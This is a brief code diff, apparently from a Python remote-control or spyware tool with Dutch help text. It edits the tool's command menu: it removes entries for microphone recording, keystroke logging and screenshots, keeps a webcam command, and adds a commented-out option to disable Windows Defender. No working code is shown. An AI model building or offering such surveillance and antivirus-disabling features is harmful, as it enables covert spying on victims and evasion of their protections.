@@ -31,10 +31,8 @@ def get_command_list() -> str:
 Command Lijst:
 /banner        -   ASCII art banner
 /webcam      -   opent de webcam
-/microfoon   -   maakt luisterbestand
-/keylogger    -   stuurt toetsenbordkeys op
-/screenshot  -   maakt een screenshot
 """
+# /stopdefender   -   Windows Defender uitgeschakelen
 
 
 # maak een video recording met de webcam
